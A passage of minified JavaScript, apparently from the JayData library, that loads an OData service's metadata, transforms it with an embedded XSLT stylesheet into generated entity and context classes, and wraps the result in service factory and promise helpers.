var self=this;self._loadXMLDoc(cnf,function(xml,response){if(response.statusCode<200||response.statusCode>299){callBack.error(response);return;}
var versionInfo=self._findVersion(xml);if(self.xsltRepoUrl){console.log('XSLT: '+self.xsltRepoUrl+self._supportedODataVersionXSLT)
self._loadXMLDoc({metadataUri:self.xsltRepoUrl+self._supportedODataVersionXSLT,user:cnf.user,password:cnf.password,httpHeaders:cnf.httpHeaders},function(xsl,response){if(response.statusCode<200||response.statusCode>299){callBack.error(response);return;}
var text=response.responseText;text=text.replace('xmlns:edm="@@VERSIONNS@@"','xmlns:edm="'+versionInfo.ns+'"');text=text.replace('@@VERSION@@',versionInfo.version);if(typeof ActiveXObject==='undefined'){var parser=new DOMParser();xsl=parser.parseFromString(text,"text/xml");}else{xsl=new ActiveXObject("Microsoft.XMLDOM");xsl.async=false;xsl.loadXML(text);}
self._transform(callBack,versionInfo,xml,xsl,cnf);});}else{self._transform(callBack,versionInfo,xml,undefined,cnf);}});},debugMode:{type:'bool',value:false},xsltRepoUrl:{type:'string',value:''},createFactoryFunc:function(ctxType,cnf){var self=this;return function(config){if(ctxType){var cfg=$data.typeSystem.extend({name:'oData',oDataServiceHost:cnf.SerivceUri,user:cnf.user,password:cnf.password,withCredentials:cnf.withCredentials},config)
return new ctxType(cfg);}else{return null;}}},_transform:function(callBack,versionInfo,xml,xsl,cnf){var self=this;var codeText=self._processResults(cnf.url,versionInfo,xml,xsl,cnf);try{eval(codeText);}catch(e){callBack.error(new Exception('SyntaxError','Unexpected model',[e,codeText]));return;}
var ctxType;if(!$data.generatedContexts||!(ctxType=$data.generatedContexts.pop())){callBack.error(new Exception('No context found in service','Not found',[cnf,codeText]));return;}
var factoryFn=self.createFactoryFunc(ctxType,cnf);this.factoryCache[cnf.url]=[factoryFn,ctxType];factoryFn.type=ctxType;if(self.debugMode){factoryFn.codeText=codeText;callBack.success(factoryFn,ctxType,codeText);}
else{callBack.success(factoryFn,ctxType);}},_loadXMLDoc:function(cnf,callback){var xhttp=new XMLHttpRequest();xhttp.open("GET",cnf.metadataUri,true);if(cnf.httpHeaders){Object.keys(cnf.httpHeaders).forEach(function(header){xhttp.setRequestHeader(header,cnf.httpHeaders[header]);});}
xhttp.onreadystatechange=function(){if(xhttp.readyState===4){var response={requestUri:cnf.metadataUri,statusCode:xhttp.status,statusText:xhttp.statusText,responseText:xhttp.responseText};callback(xhttp.responseXML||xhttp.responseText,response);}};if(cnf.user&&cnf.password&&(!cnf.httpHeaders||(cnf.httpHeaders&&!cnf.httpHeaders['Authorization'])))
xhttp.setRequestHeader("Authorization","Basic "+this.__encodeBase64(cnf.user+":"+cnf.password));xhttp.send("");},_processResults:function(metadataUri,versionInfo,metadata,xsl,cnf){var transformXslt=this.getCurrentXSLTVersion(versionInfo,metadata);if(window.ActiveXObject){var xslt=new ActiveXObject("Msxml2.XSLTemplate.6.0");var xsldoc=new ActiveXObject("Msxml2.FreeThreadedDOMDocument.6.0");var xslproc;xsldoc.async=false;if(xsl)
xsldoc.load(xsl);else
xsldoc.loadXML(transformXslt);if(xsldoc.parseError.errorCode!=0){var myErr=xsldoc.parseError;}else{xslt.stylesheet=xsldoc;var xmldoc=new ActiveXObject("Msxml2.DOMDocument.6.0");xmldoc.async=false;xmldoc.load(metadata);if(xmldoc.parseError.errorCode!=0){var myErr=xmldoc.parseError;}else{xslproc=xslt.createProcessor();xslproc.input=xmldoc;xslproc.addParameter('SerivceUri',cnf.SerivceUri);xslproc.addParameter('EntityBaseClass',cnf.EntityBaseClass);xslproc.addParameter('ContextBaseClass',cnf.ContextBaseClass);xslproc.addParameter('AutoCreateContext',cnf.AutoCreateContext);xslproc.addParameter('ContextInstanceName',cnf.ContextInstanceName);xslproc.addParameter('EntitySetBaseClass',cnf.EntitySetBaseClass);xslproc.addParameter('CollectionBaseClass',cnf.CollectionBaseClass);xslproc.addParameter('DefaultNamespace',cnf.DefaultNamespace);xslproc.transform();return xslproc.output;}}
return'';}else if(typeof document!=='undefined'&&document.implementation&&document.implementation.createDocument){var xsltStylesheet;if(xsl){xsltStylesheet=xsl;}else{var parser=new DOMParser();xsltStylesheet=parser.parseFromString(transformXslt,"text/xml");}
var xsltProcessor=new XSLTProcessor();xsltProcessor.importStylesheet(xsltStylesheet);xsltProcessor.setParameter(null,'SerivceUri',cnf.SerivceUri);xsltProcessor.setParameter(null,'EntityBaseClass',cnf.EntityBaseClass);xsltProcessor.setParameter(null,'ContextBaseClass',cnf.ContextBaseClass);xsltProcessor.setParameter(null,'AutoCreateContext',cnf.AutoCreateContext);xsltProcessor.setParameter(null,'ContextInstanceName',cnf.ContextInstanceName);xsltProcessor.setParameter(null,'EntitySetBaseClass',cnf.EntitySetBaseClass);xsltProcessor.setParameter(null,'CollectionBaseClass',cnf.CollectionBaseClass);xsltProcessor.setParameter(null,'DefaultNamespace',cnf.DefaultNamespace);resultDocument=xsltProcessor.transformToFragment(metadata,document);return resultDocument.textContent;}else if(typeof module!=='undefined'&&typeof require!=='undefined'){var xslt=require('node_xslt');return xslt.transform(xslt.readXsltString(transformXslt),xslt.readXmlString(metadata),['SerivceUri',"'"+cnf.SerivceUri+"'",'EntityBaseClass',"'"+cnf.EntityBaseClass+"'",'ContextBaseClass',"'"+cnf.ContextBaseClass+"'",'AutoCreateContext',"'"+cnf.AutoCreateContext+"'",'ContextInstanceName',"'"+cnf.ContextInstanceName+"'",'EntitySetBaseClass',"'"+cnf.EntitySetBaseClass+"'",'CollectionBaseClass',"'"+cnf.CollectionBaseClass+"'",'DefaultNamespace',"'"+cnf.DefaultNamespace+"'"]);}},_findVersion:function(metadata){if(typeof metadata==='object'&&"getElementsByTagName"in metadata){var version='http://schemas.microsoft.com/ado/2008/09/edm';var item=metadata.getElementsByTagName('Schema');if(item)
item=item[0];if(item)
item=item.attributes;if(item)
item=item.getNamedItem('xmlns');if(item)
version=item.value;var versionNum=this._supportedODataVersions[version];return{ns:version,version:versionNum||'unknown'};}else if(typeof module!=='undefined'&&typeof require!=='undefined'){var schemaXml=metadata;var schemaNamespace='http://schemas.microsoft.com/ado/2008/09/edm';var version='nodejs';for(var i in this._supportedODataVersions){if(schemaXml.search(new RegExp('<Schema.+xmlns=\"'+i+'\"','gi'))>=0){schemaNamespace=i;version=this._supportedODataVersions[i];break;}}
return{ns:schemaNamespace,version:version}}},_supportedODataVersions:{value:{"http://schemas.microsoft.com/ado/2006/04/edm":"V1","http://schemas.microsoft.com/ado/2008/09/edm":"V2","http://schemas.microsoft.com/ado/2009/11/edm":"V3","http://schemas.microsoft.com/ado/2007/05/edm":"V11"}},_supportedODataVersionXSLT:{value:"JayDataContextGenerator.xslt"},getCurrentXSLTVersion:function(versionInfo,metadata){return this._metadataConverterXSLT.replace('@@VERSIONNS@@',versionInfo.ns).replace('@@VERSION@@',versionInfo.version);},__encodeBase64:function(val){var b64array="ABCDEFGHIJKLMNOP"+"QRSTUVWXYZabcdef"+"ghijklmnopqrstuv"+"wxyz0123456789+/"+"=";var input=val;var base64="";var hex="";var chr1,chr2,chr3="";var enc1,enc2,enc3,enc4="";var i=0;do{chr1=input.charCodeAt(i++);chr2=input.charCodeAt(i++);chr3=input.charCodeAt(i++);enc1=chr1>>2;enc2=((chr1&3)<<4)|(chr2>>4);enc3=((chr2&15)<<2)|(chr3>>6);enc4=chr3&63;if(isNaN(chr2)){enc3=enc4=64;}else if(isNaN(chr3)){enc4=64;}
base64=base64+
b64array.charAt(enc1)+
b64array.charAt(enc2)+
b64array.charAt(enc3)+
b64array.charAt(enc4);chr1=chr2=chr3="";enc1=enc2=enc3=enc4="";}while(i<input.length);return base64;},_metadataConverterXSLT:{type:'string',value:"<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" \r\n"+"                xmlns:edm=\"@@VERSIONNS@@\" \r\n"+"                xmlns:m=\"http://schemas.microsoft.com/ado/2007/08/dataservices/metadata\" \r\n"+"                xmlns:metadata=\"http://schemas.microsoft.com/ado/2007/08/dataservices/metadata\" \r\n"+"                xmlns:annot=\"http://schemas.microsoft.com/ado/2009/02/edm/annotation\" \r\n"+"                xmlns:exsl=\"http://exslt.org/common\" \r\n"+"                xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" exclude-result-prefixes=\"msxsl\">\r\n"+"\r\n"+"  <xsl:key name=\"entityType\" match=\"edm:EntityType\" use=\"concat(string(../@Namespace),'.', string(@Name))\"/>\r\n"+"  <xsl:key name=\"associations\" match=\"edm:Association\" use=\"concat(string(../@Namespace),'.', string(@Name))\"/>\r\n"+"\r\n"+"  <xsl:strip-space elements=\"property item unprocessed\"/>\r\n"+"  <xsl:output method=\"text\" indent=\"no\"  />\r\n"+"  <xsl:param name=\"contextNamespace\" />\r\n"+"\r\n"+"  <xsl:param name=\"SerivceUri\" />\r\n"+"  <xsl:param name=\"EntityBaseClass\"/>\r\n"+"  <xsl:param name=\"ContextBaseClass\"/>\r\n"+"  <xsl:param name=\"AutoCreateContext\"/>\r\n"+"  <xsl:param name=\"ContextInstanceName\"/>\r\n"+"  <xsl:param name=\"EntitySetBaseClass\"/>\r\n"+"  <xsl:param name=\"CollectionBaseClass\"/>\r\n"+"  <xsl:param name=\"DefaultNamespace\"/>\r\n"+"\r\n"+"  <xsl:template match=\"/\">\r\n"+"\r\n"+"/*//////////////////////////////////////////////////////////////////////////////////////\r\n"+"////// Autogenerated by JaySvcUtil.exe http://JayData.org for more info        /////////\r\n"+"//////                             oData @@VERSION@@                                    /////////\r\n"+"//////////////////////////////////////////////////////////////////////////////////////*/\r\n"+"(function(global, $data, undefined) {\r\n"+"\r\n"+"<xsl:for-each select=\"//edm:EntityType | //edm:ComplexType\" xml:space=\"default\">\r\n"+"  <xsl:message terminate=\"no\">Info: generating type <xsl:value-of select=\"concat(../@Namespace, '.', @Name)\"/>\r\n"+"</xsl:message>\r\n"+"  <xsl:variable name=\"props\">\r\n"+"    <xsl:apply-templates select=\"*\" />\r\n"+"  </xsl:variable>\r\n"+"  <xsl:text xml:space=\"preserve\">  </xsl:text><xsl:value-of select=\"$EntityBaseClass\"  />.extend('<xsl:value-of select=\"concat($DefaultNamespace,../@Namespace)\"/>.<xsl:value-of select=\"@Name\"/>', {\r\n"+"    <xsl:choose><xsl:when test=\"function-available('msxsl:node-set')\">\r\n"+"    <xsl:for-each select=\"msxsl:node-set($props)/*\">\r\n"+"      <xsl:value-of select=\".\"/><xsl:if test=\"position() != last()\">,\r\n"+"    </xsl:if></xsl:for-each>\r\n"+"  </xsl:when>\r\n"+"  <xsl:otherwise>\r\n"+"    <xsl:for-each select=\"exsl:node-set($props)/*\">\r\n"+"      <xsl:value-of select=\".\"/><xsl:if test=\"position() != last()\">,\r\n"+"    </xsl:if></xsl:for-each>\r\n"+"    </xsl:otherwise>\r\n"+"    </xsl:choose>\r\n"+"    <xsl:variable name=\"currentName\"><xsl:value-of select=\"concat(../@Namespace,'.',@Name)\"/></xsl:variable>\r\n"+"    <xsl:for-each select=\"//edm:FunctionImport[@IsBindable and edm:Parameter[1]/@Type = $currentName]\"><xsl:if test=\"position() = 1\">,\r\n"+"    </xsl:if>\r\n"+"      <xsl:apply-templates select=\".\"></xsl:apply-templates><xsl:if test=\"position() != last()\">,\r\n"+"    </xsl:if>\r\n"+"    </xsl:for-each>\r\n"+"  });\r\n"+"  \r\n"+"</xsl:for-each>\r\n"+"\r\n"+"<xsl:for-each select=\"//edm:EntityContainer\">\r\n"+"  <xsl:text xml:space=\"preserve\">  </xsl:text><xsl:value-of select=\"$ContextBaseClass\"  />.extend('<xsl:value-of select=\"concat(concat($DefaultNamespace,../@Namespace), '.', @Name)\"/>', {\r\n"+"    <!--or (@IsBindable = 'true' and (@IsAlwaysBindable = 'false' or @m:IsAlwaysBindable = 'false' or @metadata:IsAlwaysBindable = 'false'))-->\r\n"+"    <xsl:for-each select=\"edm:EntitySet | edm:FunctionImport[not(@IsBindable) or @IsBindable = 'false']\">\r\n"+"      <xsl:apply-templates select=\".\"></xsl:apply-templates><xsl:if test=\"position() != last()\">,\r\n"+"    </xsl:if>\r\n"+"    </xsl:for-each>\r\n"+"  });\r\n"+"\r\n"+"  $data.generatedContexts = $data.generatedContexts || [];\r\n"+"  $data.generatedContexts.push(<xsl:value-of select=\"concat(concat($DefaultNamespace,../@Namespace), '.', @Name)\" />);\r\n"+"  <xsl:if test=\"$AutoCreateContext = 'true'\">\r\n"+"  /*Context Instance*/\r\n"+"  <xsl:value-of select=\"$DefaultNamespace\"/><xsl:value-of select=\"$ContextInstanceName\" /> = new <xsl:value-of select=\"concat(concat($DefaultNamespace,../@Namespace), '.', @Name)\" />({ name:'oData', oDataServiceHost: '<xsl:value-of select=\"$SerivceUri\" />' });\r\n"+"</xsl:if>\r\n"+"\r\n"+"</xsl:for-each>\r\n"+"      \r\n"+"})(window, $data);\r\n"+"      \r\n"+"    </xsl:template>\r\n"+"\r\n"+"  <xsl:template match=\"edm:Key\"></xsl:template>\r\n"+"\r\n"+"  <xsl:template match=\"edm:FunctionImport\">\r\n"+"    <xsl:text>'</xsl:text>\r\n"+"    <xsl:value-of select=\"@Name\"/>\r\n"+"    <xsl:text>': { type: </xsl:text>\r\n"+"    <xsl:choose>\r\n"+"      <xsl:when test=\"@IsBindable = 'true'\">\r\n"+"        <xsl:text>$data.ServiceAction</xsl:text>\r\n"+"      </xsl:when>\r\n"+"      <xsl:otherwise>\r\n"+"        <xsl:text>$data.ServiceOperation</xsl:text>\r\n"+"      </xsl:otherwise>\r\n"+"    </xsl:choose>\r\n"+"\r\n"+"    <xsl:apply-templates select=\"@*\" mode=\"FunctionImport-mode\"/>\r\n"+"\r\n"+"    <xsl:variable name=\"IsBindable\">\r\n"+"      <xsl:value-of select=\"@IsBindable\"/>\r\n"+"    </xsl:variable>\r\n"+"    <xsl:text>, params: [</xsl:text>\r\n"+"    <xsl:for-each select=\"edm:Parameter[($IsBindable = 'true' and position() > 1) or (($IsBindable = 'false' or $IsBindable = '') and position() > 0)]\">\r\n"+"      <xsl:text>{ name: '</xsl:text>\r\n"+"      <xsl:value-of select=\"@Name\"/>\r\n"+"      <xsl:text>', type: '</xsl:text>\r\n"+"      <xsl:apply-templates select=\"@Type\" mode=\"render-functionImport-type\" />\r\n"+"      <xsl:text>' }</xsl:text>\r\n"+"      <xsl:if test=\"position() != last()\">, </xsl:if>\r\n"+"    </xsl:for-each>    \r\n"+"    <xsl:text>]</xsl:text>\r\n"+"\r\n"+"    <xsl:text> }</xsl:text>\r\n"+"  </xsl:template>\r\n"+"  \r\n"+"  <xsl:template match=\"@ReturnType\" mode=\"FunctionImport-mode\">\r\n"+"    <xsl:text>, returnType: </xsl:text>\r\n"+"    <xsl:choose>\r\n"+"      <xsl:when test=\"not(.)\">null</xsl:when>\r\n"+"      <xsl:when test=\"starts-with(., 'Collection')\">$data.Queryable</xsl:when>\r\n"+"      <xsl:otherwise>\r\n"+"        <xsl:text>'</xsl:text>\r\n"+"        <xsl:apply-templates select=\".\" mode=\"render-functionImport-type\" />\r\n"+"        <xsl:text>'</xsl:text>\r\n"+"      </xsl:otherwise>\r\n"+"    </xsl:choose>\r\n"+"\r\n"+"    <xsl:if test=\"starts-with(., 'Collection')\">\r\n"+"      <xsl:variable name=\"len\" select=\"string-length(.)-12\"/>\r\n"+"      <xsl:variable name=\"curr\" select=\"substring(.,12,$len)\"/>\r\n"+"      <xsl:variable name=\"ElementType\" >\r\n"+"        <xsl:choose>\r\n"+"          <xsl:when test=\"//edm:Schema[starts-with($curr, @Namespace)]\">\r\n"+"            <xsl:value-of select=\"concat($DefaultNamespace,$curr)\" />\r\n"+"          </xsl:when>\r\n"+"          <xsl:otherwise>\r\n"+"            <xsl:value-of select=\"$curr\" />\r\n"+"          </xsl:otherwise>\r\n"+"        </xsl:choose>\r\n"+"      </xsl:variable>\r\n"+"      <xsl:text>, elementType: '</xsl:text>\r\n"+"      <xsl:value-of select=\"$ElementType\"/>\r\n"+"      <xsl:text>'</xsl:text>\r\n"+"    </xsl:if>\r\n"+"  </xsl:template>\r\n"+"  <xsl:template match=\"@Name\" mode=\"FunctionImport-mode\"></xsl:template>\r\n"+"  <xsl:template match=\"@m:HttpMethod\" mode=\"FunctionImport-mode\">\r\n"+"    <xsl:text>, method: '</xsl:text>\r\n"+"    <xsl:value-of select=\".\"/>\r\n"+"    <xsl:text>'</xsl:text>\r\n"+"  </xsl:template>\r\n"+"  <xsl:template match=\"@IsBindable | @IsSideEffecting | @IsAlwaysBindable | @m:IsAlwaysBindable | @metadata:IsAlwaysBindable | @IsComposable\" mode=\"FunctionImport-mode\">\r\n"+"    <xsl:text>, </xsl:text>\r\n"+"    <xsl:call-template name=\"GetAttributeName\">\r\n"+"      <xsl:with-param name=\"Name\" select=\"name()\" />\r\n"+"    </xsl:call-template>\r\n"+"    <xsl:text>: </xsl:text>\r\n"+"    <xsl:value-of select=\".\"/>\r\n"+"  </xsl:template>\r\n"+"  <xsl:template match=\"@*\" mode=\"FunctionImport-mode\">\r\n"+"    <xsl:text>, '</xsl:text>\r\n"+"    <xsl:call-template name=\"GetAttributeName\">\r\n"+"      <xsl:with-param name=\"Name\" select=\"name()\" />\r\n"+"    </xsl:call-template>\r\n"+"    <xsl:text>': '</xsl:text>\r\n"+"    <xsl:value-of select=\".\"/>        \r\n"+"    <xsl:text>'</xsl:text>\r\n"+"  </xsl:template>\r\n"+"  <xsl:template name=\"GetAttributeName\">\r\n"+"    <xsl:param name=\"Name\" />\r\n"+"    <xsl:choose>\r\n"+"      <xsl:when test=\"contains($Name, ':')\">\r\n"+"        <xsl:value-of select=\"substring-after($Name, ':')\"/>\r\n"+"      </xsl:when>\r\n"+"      <xsl:otherwise>\r\n"+"        <xsl:value-of select=\"$Name\"/>\r\n"+"      </xsl:otherwise>\r\n"+"    </xsl:choose>\r\n"+"  </xsl:template>\r\n"+"\r\n"+"  <xsl:template match=\"edm:EntitySet\">'<xsl:value-of select=\"@Name\"/>': { type: <xsl:value-of select=\"$EntitySetBaseClass\"  />, elementType: <xsl:value-of select=\"concat($DefaultNamespace,@EntityType)\"/><xsl:text> </xsl:text><xsl:apply-templates select=\".\" mode=\"Collection-Actions\" />}</xsl:template>\r\n"+"\r\n"+"  <xsl:template match=\"edm:EntitySet\" mode=\"Collection-Actions\">\r\n"+"    <xsl:variable name=\"CollectionType\" select=\"concat('Collection(', @EntityType, ')')\" />\r\n"+"    <xsl:for-each select=\"//edm:FunctionImport[edm:Parameter[1]/@Type = $CollectionType]\">\r\n"+"      <xsl:if test=\"position() = 1\">\r\n"+"        <xsl:text>, actions: { \r\n"+"        </xsl:text>\r\n"+"      </xsl:if>\r\n"+"        <xsl:apply-templates select=\".\"></xsl:apply-templates><xsl:if test=\"position() != last()\">,\r\n"+"        </xsl:if>\r\n"+"      <xsl:if test=\"position() = last()\">\r\n"+"        <xsl:text>\r\n"+"      }</xsl:text>\r\n"+"      </xsl:if>\r\n"+"    </xsl:for-each>\r\n"+"  </xsl:template>\r\n"+"  \r\n"+"  <xsl:template match=\"edm:Property | edm:NavigationProperty\">\r\n"+"    <property>\r\n"+"    <xsl:variable name=\"memberDefinition\">\r\n"+"      <xsl:if test=\"parent::edm:EntityType/edm:Key/edm:PropertyRef[@Name = current()/@Name]\"><attribute name=\"key\">true</attribute></xsl:if>\r\n"+"      <xsl:apply-templates select=\"@*[local-name() != 'Name']\" mode=\"render-field\" />\r\n"+"    </xsl:variable>'<xsl:value-of select=\"@Name\"/>': { <xsl:choose><xsl:when test=\"function-available('msxsl:node-set')\"><xsl:for-each select=\"msxsl:node-set($memberDefinition)/*\">'<xsl:if test=\"@extended = 'true'\">$</xsl:if><xsl:value-of select=\"@name\"/>':<xsl:value-of select=\".\"/>\r\n"+"      <xsl:if test=\"position() != last()\">,<xsl:text> </xsl:text>\r\n"+"    </xsl:if> </xsl:for-each></xsl:when>\r\n"+"  <xsl:otherwise><xsl:for-each select=\"exsl:node-set($memberDefinition)/*\">'<xsl:if test=\"@extended = 'true'\">$</xsl:if><xsl:value-of select=\"@name\"/>':<xsl:value-of select=\".\"/>\r\n"+"      <xsl:if test=\"position() != last()\">,<xsl:text> </xsl:text>\r\n"+"    </xsl:if> </xsl:for-each></xsl:otherwise>\r\n"+"    </xsl:choose> }</property>\r\n"+"</xsl:template>\r\n"+"  \r\n"+"  <xsl:template match=\"@Name\" mode=\"render-field\">\r\n"+"  </xsl:template>\r\n"+"\r\n"+"  <xsl:template match=\"@Type\" mode=\"render-field\">\r\n"+"    <xsl:choose>\r\n"+"      <xsl:when test=\"starts-with(., 'Collection')\">\r\n"+"        <attribute name=\"type\">'Array'</attribute>\r\n"+"        <xsl:variable name=\"len\" select=\"string-length(.)-12\"/>\r\n"+"        <xsl:choose>\r\n"+"          <xsl:when test=\"starts-with(., ../../../@Namespace)\">\r\n"+"            <attribute name=\"elementType\">'<xsl:value-of select=\"$DefaultNamespace\"/><xsl:value-of select=\"substring(.,12,$len)\" />'</attribute>\r\n"+"          </xsl:when>\r\n"+"          <xsl:otherwise>\r\n"+"            <attribute name=\"elementType\">'<xsl:value-of select=\"substring(.,12,$len)\" />'</attribute>\r\n"+"          </xsl:otherwise>\r\n"+"        </xsl:choose>\r\n"+"      </xsl:when>\r\n"+"      <xsl:when test=\"starts-with(., ../../../@Namespace)\">\r\n"+"        <attribute name=\"type\">'<xsl:value-of select=\"$DefaultNamespace\"/><xsl:value-of select=\".\"/>'</attribute>\r\n"+"      </xsl:when>\r\n"+"      <xsl:otherwise>\r\n"+"        <attribute name=\"type\">'<xsl:value-of select=\".\"/>'</attribute>\r\n"+"      </xsl:otherwise>\r\n"+"    </xsl:choose>\r\n"+"  </xsl:template>\r\n"+"\r\n"+"  <xsl:template match=\"@ConcurrencyMode\" mode=\"render-field\">\r\n"+"    <attribute name=\"concurrencyMode\">$data.ConcurrencyMode.<xsl:value-of select=\".\"/></attribute>\r\n"+"  </xsl:template>\r\n"+"\r\n"+"  <xsl:template match=\"@Nullable\" mode=\"render-field\">\r\n"+"    <attribute name=\"nullable\"><xsl:value-of select=\".\"/></attribute>\r\n"+"    \r\n"+"    <xsl:if test=\". = 'false'\">\r\n"+"      <xsl:choose>\r\n"+"        <xsl:when test=\"parent::edm:Property/@annot:StoreGeneratedPattern = 'Identity' or parent::edm:Property/@annot:StoreGeneratedPattern = 'Computed'\"></xsl:when>\r\n"+"        <xsl:otherwise><attribute name=\"required\">true</attribute></xsl:otherwise>\r\n"+"      </xsl:choose>\r\n"+"    </xsl:if>\r\n"+"  </xsl:template>\r\n"+"\r\n"+"  <xsl:template match=\"@annot:StoreGeneratedPattern\" mode=\"render-field\">\r\n"+"    <xsl:if test=\". != 'None'\"><attribute name=\"computed\">true</attribute></xsl:if>    \r\n"+"  </xsl:template>\r\n"+"\r\n"+"  <xsl:template match=\"@MaxLength\" mode=\"render-field\">\r\n"+"    <attribute name=\"maxLength\">\r\n"+"      <xsl:choose>\r\n"+"        <xsl:when test=\"string(.) = 'Max'\">Number.POSITIVE_INFINITY</xsl:when>\r\n"+"        <xsl:otherwise>\r\n"+"          <xsl:value-of select=\".\"/>\r\n"+"        </xsl:otherwise>\r\n"+"      </xsl:choose>\r\n"+"    </attribute>\r\n"+"  </xsl:template>\r\n"+"\r\n"+"  <xsl:template match=\"@FixedLength | @Unicode | @Precision | @Scale\" mode=\"render-field\">\r\n"+"  </xsl:template>\r\n"+"  <xsl:template match=\"@*\" mode=\"render-field\">\r\n"+"    <xsl:variable name=\"nameProp\">\r\n"+"      <xsl:choose>\r\n"+"        <xsl:when test=\"substring-after(name(), ':') != ''\">\r\n"+"          <xsl:value-of select=\"substring-after(name(), ':')\"/>\r\n"+"        </xsl:when>\r\n"+"        <xsl:otherwise>\r\n"+"          <xsl:value-of select=\"name()\"/>\r\n"+"        </xsl:otherwise>\r\n"+"      </xsl:choose>\r\n"+"    </xsl:variable>\r\n"+"    <xsl:element name=\"attribute\"><xsl:attribute name=\"extended\">true</xsl:attribute><xsl:attribute name=\"name\"><xsl:value-of select=\"$nameProp\"/></xsl:attribute>'<xsl:value-of select=\".\"/>'</xsl:element>\r\n"+"  </xsl:template>\r\n"+"\r\n"+"  <xsl:template match=\"@Relationship\" mode=\"render-field\">\r\n"+"    <xsl:variable name=\"relationName\" select=\"string(../@ToRole)\"/>\r\n"+"    <xsl:variable name=\"relationshipName\" select=\"string(.)\" />\r\n"+"    <xsl:variable name=\"relation\" select=\"key('associations',string(.))/edm:End[@Role = $relationName]\" />\r\n"+"    <xsl:variable name=\"otherName\" select=\"../@FromRole\" />\r\n"+"    <xsl:variable name=\"otherProp\" select=\"//edm:NavigationProperty[@ToRole = $otherName and @Relationship = $relationshipName]\" />\r\n"+"    <xsl:variable name=\"m\" select=\"$relation/@Multiplicity\" />\r\n"+"    <xsl:choose>\r\n"+"      <xsl:when test=\"$m = '*'\">\r\n"+"        <attribute name=\"type\">'<xsl:value-of select=\"$CollectionBaseClass\"/>'</attribute>\r\n"+"        <attribute name=\"elementType\">'<xsl:value-of select=\"$DefaultNamespace\"/><xsl:value-of select=\"$relation/@Type\"/>'</attribute>\r\n"+"        <xsl:if test=\"not($otherProp/@Name)\">\r\n"+"          <attribute name=\"inverseProperty\">'$$unbound'</attribute></xsl:if>\r\n"+"        <xsl:if test=\"$otherProp/@Name\">\r\n"+"          <attribute name=\"inverseProperty\">'<xsl:value-of select=\"$otherProp/@Name\"/>'</attribute></xsl:if>\r\n"+"      </xsl:when>\r\n"+"      <xsl:when test=\"$m = '0..1'\">\r\n"+"        <attribute name=\"type\">'<xsl:value-of select=\"$DefaultNamespace\"/><xsl:value-of select=\"$relation/@Type\"/>'</attribute>\r\n"+"        <xsl:choose>\r\n"+"          <xsl:when test=\"$otherProp\">\r\n"+"            <attribute name=\"inverseProperty\">'<xsl:value-of select=\"$otherProp/@Name\"/>'</attribute>\r\n"+"          </xsl:when >\r\n"+"          <xsl:otherwise>\r\n"+"            <attribute name=\"inverseProperty\">'$$unbound'</attribute>\r\n"+"            <xsl:message terminate=\"no\">  Warning: inverseProperty other side missing: <xsl:value-of select=\".\"/>\r\n"+"          </xsl:message>\r\n"+"          </xsl:otherwise>\r\n"+"        </xsl:choose>\r\n"+"      </xsl:when>\r\n"+"      <xsl:when test=\"$m = '1'\">\r\n"+"        <attribute name=\"type\">'<xsl:value-of select=\"$DefaultNamespace\"/><xsl:value-of select=\"$relation/@Type\"/>'</attribute>\r\n"+"        <attribute name=\"required\">true</attribute>\r\n"+"        <xsl:choose>\r\n"+"          <xsl:when test=\"$otherProp\">\r\n"+"            <attribute name=\"inverseProperty\">'<xsl:value-of select=\"$otherProp/@Name\"/>'</attribute>\r\n"+"          </xsl:when >\r\n"+"          <xsl:otherwise>\r\n"+"            <attribute name=\"inverseProperty\">'$$unbound'</attribute>\r\n"+"            <xsl:message terminate=\"no\">\r\n"+"              Warning: inverseProperty other side missing: <xsl:value-of select=\".\"/>\r\n"+"            </xsl:message>\r\n"+"          </xsl:otherwise>\r\n"+"        </xsl:choose>\r\n"+"      </xsl:when>\r\n"+"    </xsl:choose>\r\n"+"  </xsl:template>\r\n"+"\r\n"+"\r\n"+"  <xsl:template match=\"@FromRole | @ToRole\" mode=\"render-field\"></xsl:template>\r\n"+"\r\n"+"  <xsl:template match=\"*\" mode=\"render-field\">\r\n"+"    <!--<unprocessed>!!<xsl:value-of select=\"name()\"/>!!</unprocessed>-->\r\n"+"    <xsl:message terminate=\"no\">  Warning: <xsl:value-of select=\"../../@Name\"/>.<xsl:value-of select=\"../@Name\"/>:<xsl:value-of select=\"name()\"/> is an unknown/unprocessed attribued</xsl:message>\r\n"+"  </xsl:template>\r\n"+"  <!--<xsl:template match=\"*\">\r\n"+"    !<xsl:value-of select=\"name()\"/>!\r\n"+"  </xsl:template>-->\r\n"+"</xsl:stylesheet>\r\n"}});$data.MetadataLoader=new $data.MetadataLoaderClass();$data.service=function(serviceUri,config,cb){var _url,_config,_callback;function getParam(paramValue){switch(typeof paramValue){case'object':if(typeof paramValue.success==='function'||typeof paramValue.error==='function'){_callback=paramValue;}else{_config=paramValue;}
break;case'function':_callback=paramValue;break;default:break;}}
getParam(config);getParam(cb);if(typeof serviceUri==='object'){_config=$data.typeSystem.extend(serviceUri,_config);serviceUri=serviceUri.url;delete _config.url;}
var pHandler=new $data.PromiseHandler();_callback=pHandler.createCallback(_callback);$data.MetadataLoader.load(serviceUri,{success:function(factory){var type=factory.type;if(_config){var storeAlias=_config.serviceName||_config.storeAlias;if(storeAlias&&'addStore'in $data){$data.addStore(storeAlias,factory,_config.isDefault===undefined||_config.isDefault)}}
_callback.success(factory,type);},error:_callback.error},_config);return pHandler.getPromise();};(function($data){if(typeof jQuery!=='undefined'){$data.Class.define('$data.Deferred',$data.PromiseHandlerBase,null,{constructor:function(){this.deferred=new $.Deferred();},deferred:{},createCallback:function(callBack){callBack=$data.typeSystem.createCallbackSetting(callBack);var self=this;return cbWrapper={success:function(){callBack.success.apply(self.deferred,arguments);self.deferred.resolve.apply(self.deferred,arguments);},error:function(){Array.prototype.push.call(arguments,self.deferred);callBack.error.apply(self.deferred,arguments);},notify:function(){callBack.notify.apply(self.deferred,arguments);self.deferred.notify.apply(self.deferred,arguments);}};},getPromise:function(){return this.deferred.promise();}},null);$data.PromiseHandler=$data.Deferred;}})($data);(function($data){$data.initService=function(apiKey,options){var d=new $data.PromiseHandler();var cfg;if(typeof apiKey==='object'){cfg=apiKey;var protocol=cfg.isSSL||cfg.isSSL===undefined?'https':'http';var port=cfg.port?(':'+cfg.port):'';if(typeof 